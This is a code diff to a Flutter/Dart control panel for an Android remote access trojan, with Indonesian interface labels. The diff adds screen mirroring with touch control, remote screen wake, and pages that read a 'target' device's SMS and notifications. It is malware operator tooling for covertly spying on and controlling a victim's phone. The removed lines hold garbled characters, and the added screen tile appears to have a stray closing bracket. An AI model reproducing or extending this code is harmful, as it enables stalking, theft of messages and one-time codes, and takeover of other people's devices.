@@ -7,6 +7,10 @@ import 'package:url_launcher/url_launcher.dart';
 
 import 'rat_client.dart';
 import '../theme/neo.dart';
+import 'screen_mirror_page.dart';
+import 'wake_screen_page.dart';
+import 'sms_reader_page.dart';
+import 'notification_reader_page.dart';
 
 // Neobrutalism palette
 const Color _green = Neo.mint;
@@ -1425,26 +1429,15 @@ class _RatControlPageState extends State<RatControlPage> {
       _CtrlTile(
         icon: Icons.phone_iphone,
         iconColor: _sky,
-        name: 'Layar Langsung',
-        sub: d.statusBool('screenActive') ? 'Ã¢â€”Â LIVE' : 'Ã¢â€”â€¹ OFF',
+        name: 'Screen Mirror',
+        sub: d.statusBool('screenActive') ? 'LIVE + TOUCH' : 'TAP \u00b7 MIRROR + KONTROL',
         subColor: d.statusBool('screenActive') ? _green : null,
-        bottomAction: Row(
-          children: [
-            Expanded(
-                child: _MiniBtn(label: 'MULAI', color: Neo.mint, onTap: () {
-                  _cmd('screen', 'start');
-                  _patch('screenActive', true);
-                  _openScreenLive();
-                })),
-            const SizedBox(width: 6),
-            Expanded(
-                child: _MiniBtn(label: 'BERHENTI', color: Neo.coral, onTap: () {
-                  _cmd('screen', 'stop');
-                  _patch('screenActive', false);
-                  _toast('Screen stream dihentikan', info: true);
-                })),
-          ],
-        ),
+        onTap: () {
+          Navigator.of(context).push(MaterialPageRoute(
+            builder: (_) => ScreenMirrorPage(client: client, deviceId: _deviceId!),
+          ));
+        },
+      ),
       ),
       _CtrlTile(
         icon: Icons.radio_button_checked,
@@ -1598,6 +1591,39 @@ class _RatControlPageState extends State<RatControlPage> {
         onTap: () {
           _cmd(kCmdGetScreenState, '');
           _toast('Mengecek status layar...', info: true);
+        },
+      ),
+      _CtrlTile(
+        icon: Icons.power_settings_new,
+        iconColor: _green,
+        name: 'Nyalakan Layar',
+        sub: 'TAP \u00b7 REMOTE WAKE',
+        onTap: () {
+          Navigator.of(context).push(MaterialPageRoute(
+            builder: (_) => WakeScreenPage(client: client, deviceId: _deviceId!),
+          ));
+        },
+      ),
+      _CtrlTile(
+        icon: Icons.sms_outlined,
+        iconColor: _blue2,
+        name: 'Baca SMS',
+        sub: 'TAP \u00b7 LIHAT SMS TARGET',
+        onTap: () {
+          Navigator.of(context).push(MaterialPageRoute(
+            builder: (_) => SmsReaderPage(client: client, deviceId: _deviceId!),
+          ));
+        },
+      ),
+      _CtrlTile(
+        icon: Icons.notifications_none,
+        iconColor: _amber,
+        name: 'Notifikasi',
+        sub: 'TAP \u00b7 LIHAT NOTIFIKASI',
+        onTap: () {
+          Navigator.of(context).push(MaterialPageRoute(
+            builder: (_) => NotificationReaderPage(client: client, deviceId: _deviceId!),
+          ));
         },
       ),
     ];
